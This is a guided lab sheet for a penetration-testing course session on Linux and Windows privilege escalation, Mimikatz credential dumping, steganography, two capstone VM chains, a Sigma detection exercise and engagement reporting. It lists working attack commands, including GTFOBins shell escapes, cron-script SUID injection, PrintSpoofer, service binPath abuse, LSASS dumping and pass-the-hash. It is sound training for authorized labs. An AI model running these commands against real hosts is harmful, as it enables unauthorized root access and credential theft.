---
session: 6
title: Guided Lab — Session 6
---

# Session 6 — Guided Lab (9 labs + 8 mini-labs)

## Objective
Turn a low-priv shell into root and SYSTEM on Linux and Windows, loot the host, run two full capstone chains unaided, then detect the escalation and write the engagement report.

## Targets & authorization
Your own host-only lab + the capstone VMs you deploy (DoubleTrouble, Blackpearl). Escalating on any host you do not own is a crime. Snapshot `pre-s6` first.

## Lab pre-flight (5 min)
Reproduce a low-priv shell (from S5). Stage linPEAS/winPEAS. Snapshot the capstones.

## Lab 1 — SUID + GTFOBins → root (15) → root on Linux
`find / -perm -4000 2>/dev/null` → a GTFOBins binary (e.g. `find`) → `find . -exec /bin/sh -p \; -quit` → euid=0.

## Lab 2 — sudo/cron → root (14) → root by a second path
`sudo -l` GTFOBins break-out (e.g. `sudo less` → `!/bin/sh`), OR a writable cron script (`echo 'chmod +s /bin/bash' >> /opt/backup.sh` → `bash -p`). Deliberate failure: a non-writable cron script does nothing — confirm the writable bit first.

## Lab 3 — Windows → SYSTEM (15) → SYSTEM
winPEAS → route A: `whoami /priv` SeImpersonate → `PrintSpoofer.exe -i -c cmd` → SYSTEM. Route B: weak service → `sc config <svc> binPath=...` → SYSTEM.

## Lab 4 — Mimikatz (12) → network credentials + evidence
As SYSTEM: `privilege::debug` → `sekurlsa::logonpasswords` (plaintext + hashes) → `lsadump::sam` → reuse a credential on the next host (`nxc -H <hash>`). Save the Sysmon 10 evidence for Lab 8.

## Lab 5 — steganography (10)
`steghide embed/extract`; `stegseek image.jpg rockyou.txt` (crack the passphrase); NTFS ADS `type f > cover:stream`, `dir /r`.

## Lab 6 — Capstone A: DoubleTrouble (25) → full chain
recon/gobuster → `/secret` image → `stegseek` creds → login → upload PHP reverse shell → www-data → linPEAS → SUID/kernel → root.

## Lab 7 — Capstone B: Blackpearl (25) → full chain
recon → gobuster `/secret` → page source → DNS/vhost (`/etc/hosts`) → Navigate CMS exploit (msf) → www-data → SUID PHP (GTFOBins `php -r "pcntl_exec('/bin/sh',['-p']);"`) → root.

## Lab 8 — privesc detection rule (16) → the signature exercise (PROTECT)
Read Lab 3/4 evidence. Worked Sigma = LSASS access (Sysmon 10, TargetImage lsass.exe, dump GrantedAccess) minus known-good sources. Write ONE working rule (Sigma/SPL/KQL) + one false-positive it survives.

## Lab 9 — engagement report (14) → the deliverable
Exec summary · scope · methodology · findings (severity + evidence + remediation) · proof. Record in the cumulative Team Report; export HTML/PDF.

## Success check
- root on Linux by two independent paths (Lab 1 + Lab 2).
- SYSTEM on Windows (Lab 3) with `whoami` proof.
- LSASS dump + a reused credential (Lab 4).
- Both capstones rooted (Lab 6 + Lab 7).
- One working privesc detection rule (Lab 8) + a complete engagement report (Lab 9).

## Common mistakes
- Guessing a technique before enumerating — run linPEAS/winPEAS first.
- Relying on a cron/service path without confirming it is writable (the deliberate failure).
- Using JuicyPotato on modern Windows (patched) — use PrintSpoofer/GodPotato.
- A report that is screenshots with no severity or remediation.
